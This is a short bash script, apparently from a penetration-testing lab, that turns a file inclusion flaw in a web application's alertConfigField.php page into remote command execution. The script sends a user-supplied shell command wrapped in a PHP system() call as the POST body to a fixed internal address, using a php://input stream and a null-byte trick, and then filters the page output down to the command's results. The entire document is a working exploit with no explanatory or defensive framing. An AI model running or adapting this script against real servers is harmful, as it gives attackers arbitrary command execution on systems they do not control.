#!/bin/bash
 
if [ -z "$1" ]; then
        echo "No remote command given"
        exit 1
fi
 
curl -s --data "<?system('${*}');?>" "http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=php://input%00" | egrep -v ' *<.*' | grep -v -i "check variable"
